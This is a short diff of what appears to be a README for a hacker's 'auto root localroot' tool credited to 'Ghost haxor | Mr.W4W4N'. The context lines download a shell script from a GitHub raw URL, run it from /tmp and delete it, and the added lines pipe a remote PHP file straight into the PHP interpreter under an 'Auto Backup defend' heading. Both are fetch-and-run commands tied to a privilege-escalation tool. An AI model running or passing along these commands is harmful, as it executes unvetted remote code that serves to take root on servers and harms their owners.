@@ -10,6 +10,9 @@ curl -L https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/modro
 && /tmp/modrot.sh \
 && rm -f /tmp/modrot.sh
 ```
-
+# Auto Backup defend 🙂‍↔️
+```
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/autobackup.php | php - backup y
+```
 
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
